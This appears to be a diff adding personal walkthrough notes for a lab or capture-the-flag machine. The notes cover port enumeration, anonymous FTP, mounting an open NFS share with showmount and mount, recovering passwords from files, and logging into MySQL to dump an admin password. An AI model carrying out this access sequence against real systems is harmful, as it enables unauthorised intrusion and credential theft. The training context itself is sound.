@@ -1,0 +1,66 @@
+IP : 10.10.100.114
+
+Open Ports : 21,22,111,2049,3306
+
+Anonymous FTP login allowed.
+
+We found ms-sql credentials : root:ff912ABD*
+
+We can also see NFS on 2049 : 
+
+	use showmount -e 10.10.100.114
+
+	Export list for 10.10.100.114:
+	/opt/files *
+
+Create a directory in /mnt
+Mount the remote share : sudo mount -t nfs 10.10.100.114:/opt/files /mnt/AdventNFS
+
+Now we can traverse through the share in out /mnt/AdventNFS directory
+
+We found a creds.txt file with a password : securepassword123
+
+Now lets check the mysql server with the credentials we got from file.txt on ftp
+
+	mysql -h 10.10.100.114 -u root -p
+
+
+MySQL [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| data               |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+5 rows in set (0.160 sec)
+
+MySQL [(none)]> use data
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MySQL [data]> show tables;
++----------------+
+| Tables_in_data |
++----------------+
+| USERS          |
++----------------+
+1 row in set (0.160 sec)
+
+MySQL [data]> select * from USERS;
++-------+--------------+
+| name  | password     |
++-------+--------------+
+| admin | bestpassword |
++-------+--------------+
+1 row in set (0.241 sec)
+
+MySQL [data]> 
+
+
+We found new password : bestpassword
+
+!!!
